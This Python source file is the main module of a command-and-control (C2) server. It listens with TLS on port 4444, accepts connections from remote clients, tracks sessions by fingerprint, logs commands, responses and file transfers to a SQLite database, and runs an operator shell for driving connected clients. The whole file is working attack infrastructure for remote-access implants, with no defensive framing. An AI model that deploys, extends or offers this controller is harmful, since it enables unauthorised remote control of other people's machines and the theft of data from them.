#!/usr/bin/env python3
import os, socket, threading, ssl, signal, sys

from .utils import sessions, shell, db_logger, common

def main():
    # Setup database
    db_path = os.path.join(os.path.dirname(__file__), "data", "c2_logs.sqlite3")
    conn = db_logger.init_db(db_path)
    
    # Create database hooks - UPDATED FOR CONTEXT PARAMETER
    db_hooks = {
        "register_client": lambda fp, data, ip, port: 
            db_logger.register_or_update_client(conn, fp, data, ip, port),
        "record_session_open": lambda cid, ip, port: 
            db_logger.record_session_open(conn, cid, ip, port),
        "record_session_close": lambda cid: 
            db_logger.record_session_close(conn, cid),
        "record_command": lambda cid, cmd, context="interact":
            db_logger.record_command(conn, cid, cmd, context),
        "record_response": lambda cid, data: 
            db_logger.record_response(conn, cid, data),
        "record_transfer": lambda cid, d, n, s, context="interact":
            db_logger.record_file_transfer(conn, cid, d, n, s, context),
    }
    
    # Setup TLS
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    cert_path = os.path.join(os.path.dirname(__file__), "server.crt")
    key_path = os.path.join(os.path.dirname(__file__), "server.key")
    context.load_cert_chain(certfile=cert_path, keyfile=key_path)
    
    # Create server socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)
    
    # Set socket timeout to handle shutdown gracefully
    server.settimeout(1.0)
    
    # Use the box_runtime function from common
    common.box_runtime("[*] Server listening on 0.0.0.0:4444")
    
    # Start shell thread
    base_dir = os.path.join(os.path.dirname(__file__), "files_to_share")
    os.makedirs(base_dir, exist_ok=True)
    
    # Create shutdown event
    shutdown_event = threading.Event()
    
    shell_thread = threading.Thread(
        target=shell.server_shell,
        args=(base_dir, db_hooks, shutdown_event),
        daemon=True
    )
    shell_thread.start()
    
    # Legacy client counter (for clients without fingerprint)
    legacy_client_id = 0
    
    # Threads list to keep track of client handlers
    client_threads = []
    
    # Signal handler for Ctrl+C
    def signal_handler(sig, frame):
        print("\n[!] Received shutdown signal")
        shutdown_event.set()
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while not shutdown_event.is_set():
            try:
                raw_sock, addr = server.accept()
                print(f"[+] Connection from {addr[0]}:{addr[1]}")
                
                try:
                    client_socket = context.wrap_socket(raw_sock, server_side=True)
                except ssl.SSLError as e:
                    print(f"[!] TLS error from {addr}: {e}")
                    raw_sock.close()
                    continue
                
                # Increment legacy counter (will be overridden if client sends fingerprint)
                legacy_client_id += 1
                temp_cid = legacy_client_id
                
                # Add to sessions dict with temp ID
                sessions.add_client(temp_cid, client_socket)
                
                # Start handler thread and keep track of it
                client_thread = threading.Thread(
                    target=sessions.handle_client,
                    args=(client_socket, addr, temp_cid, db_hooks),
                    daemon=True
                )
                client_thread.start()
                client_threads.append(client_thread)
                
            except socket.timeout:
                # Timeout for accept, check if we should shutdown
                continue
            except OSError as e:
                if shutdown_event.is_set():
                    break
                print(f"[!] Socket error: {e}")
                break
    
    except KeyboardInterrupt:
        print("\n[!] Shutting down")
        shutdown_event.set()
    except OSError as e:
        if not shutdown_event.is_set():
            print(f"[!] Server error: {e}")
    finally:
        print("[*] Shutting down server...")
        shutdown_event.set()
        
        # Close all client connections
        sessions.close_all_sessions()
        
        # Close server socket
        try:
            server.close()
        except:
            pass
        
        # Close database connection
        try:
            conn.close()
        except:
            pass
        
        # Wait a moment for threads to finish
        print("[*] Waiting for threads to finish...")
        for thread in client_threads:
            try:
                thread.join(timeout=1.0)
            except:
                pass
        
        print("[*] Server shutdown complete")
        # Exit the program gracefully
        sys.exit(0)

if __name__ == "__main__":
    main()